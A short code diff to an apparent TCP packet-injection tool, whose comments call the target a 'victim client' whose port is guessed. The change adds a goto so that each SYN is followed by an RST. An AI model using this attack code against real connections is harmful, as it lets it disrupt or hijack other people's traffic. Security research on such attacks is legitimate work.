@@ -205,6 +205,7 @@ int main(int argc, char *argv[])
 
         for (dport=dport_low; dport <= dport_high; dport++) {
 
+rerun:
             delay_until(&last_time, delay);
 
             pkt.dport = htons(dport);   // Victim client's port (our guess)
@@ -217,6 +218,7 @@ int main(int argc, char *argv[])
             if (both_flag && pkt.flags == TH_SYN) {
                 pkt.flags = TH_RST;
                 pkt.seq++;
+                goto rerun;
             } else if (both_flag && pkt.flags == TH_RST) {
                 pkt.flags = TH_SYN;
                 pkt.seq--;
